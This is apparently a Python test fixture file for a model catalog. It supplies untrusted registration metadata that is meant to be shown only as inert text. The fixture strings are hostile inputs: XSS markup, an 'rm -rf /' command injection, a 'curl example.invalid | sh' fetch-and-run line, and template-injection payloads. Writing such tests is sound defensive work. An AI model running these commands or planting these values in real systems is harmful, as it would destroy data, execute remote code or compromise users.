"""Untrusted catalog/registration metadata fixtures; stored and shown as inert text only."""

UNTRUSTED_REGISTRATIONS = {
    "markup-name": {"name": "<img src=x onerror=alert(1)>", "limitations": ["<script>steal()</script>"]},
    "command-text": {"name": "model; rm -rf /", "limitations": ["$(curl example.invalid | sh)"]},
    "template-text": {"name": "{{constructor.constructor('x')()}}", "limitations": ["${process.exit()}"]},
}


def registration(fixture, **changes):
    body = {
        "name": "Untrusted metadata model",
        "version": "1.2.3",
        "artifactKind": "model",
        "digest": "sha256:" + "d" * 64,
        "originRef": "urn:example:untrusted:model",
        "providerIds": ["studio.reference"],
        "apiVersions": ["xverse.io/xdl/v1alpha1"],
    }
    return {**body, **UNTRUSTED_REGISTRATIONS.get(fixture, {}), **changes}
